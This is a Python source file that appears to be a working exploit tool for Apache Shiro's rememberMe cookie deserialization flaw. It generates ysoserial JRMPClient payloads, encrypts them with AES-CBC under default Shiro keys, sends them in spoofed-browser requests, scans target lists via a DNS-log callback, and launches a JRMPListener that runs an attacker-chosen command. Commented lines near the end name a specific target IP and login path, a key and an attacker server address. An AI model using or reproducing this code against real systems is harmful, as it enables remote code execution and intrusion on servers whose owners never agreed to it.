import requests
import random
import subprocess
import base64
import hashlib
import re
import os
import fire
import uuid
import config
import sys
from Crypto.Cipher import AES


def encode_rememberme(server, key):
    """构造payload"""
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', server], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext.decode()


def fake_headers():
    """
    生成伪造请求头
    """
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/68.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) '
        'Gecko/20100101 Firefox/68.0',
        'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/68.0']
    ua = random.choice(user_agents)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,'
                  'application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Referer': 'https://www.google.com/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
    }
    return headers


def check_url(url):
    r = re.match(r'(https?)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', url)
    if r:
        return r
    else:
        return None


def JRMPListener(port, module_type, command):
    module_type = int(module_type)
    if module_type == 1:
        module = 'CommonsCollections1'
    elif module_type == 2:
        module = 'CommonsCollections2'
    elif module_type == 3:
        module = 'CommonsCollections3'
    elif module_type == 4:
        module = 'CommonsCollections4'
    elif module_type == 5:
        module = 'CommonsCollections5'
    elif module_type == 6:
        module = 'CommonsCollections6'
    elif module_type == 7:
        module = 'CommonsBeanutils1'
    else:
        module = 'CommonsCollections4'

    cmd = ['java','-cp','ysoserial.jar','ysoserial.exploit.JRMPListener','%s' %port,'%s' %module,'\'%s\'' %command]
    stf_p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    return stf_p

class ShiroExploit(object):
    def __init__(self):
        pass

    def get(self, url, payload, params=None, headers=None, cookies=None, timeout=3):
        if headers is not None:
            pass
        else:
            headers = fake_headers()
        if cookies is not None:
            pass
        else:
            cookies = dict()
        try:
            cookies['rememberMe'] = payload
            resp = requests.get(url, params, headers=headers, cookies=cookies, timeout=timeout)
            return resp
        except Exception as e:
            return None

    def post(self, url, payload, data=None, headers=None, cookies=None, timeout=3):
        if headers is not None:
            pass
        else:
            headers = fake_headers()
        if cookies is not None:
            pass
        else:
            cookies = dict()
        try:
            cookies['rememberMe'] = payload
            resp = requests.get(url, data, headers=headers, cookies=cookies, timeout=timeout)
            return resp
        except Exception as e:
            return None

    def check(self, target, dnslog):
        targets = []
        if check_url(target):
            targets.append(target)
        else:
            targets = open(target, 'r').readlines()
        for target in targets:
            target = target.strip()
            for key in config.keys:
                prefix = hashlib.md5((key + target).encode()).hexdigest()
                payload = encode_rememberme(prefix + '.' + dnslog, key)
                print(target, key, prefix)
                self.get(target, payload)

    def exploit(self, target, key, server):
        port = server.split(':')[-1]
        payload = encode_rememberme(server, key)
        # JRMPListener(port, 5, command=command)
        self.get(target, payload=payload)


if __name__ == '__main__':
    shiro = ShiroExploit()
    fire.Fire(ShiroExploit)
    # check_url('http://117.25.162.5:8080/ims/login')
    # shiro.exploit('http://117.25.162.5:8080/ims/login', 'kPH+bIxk5D2deZiIxcaaaA==', '39.108.3.16:1009')
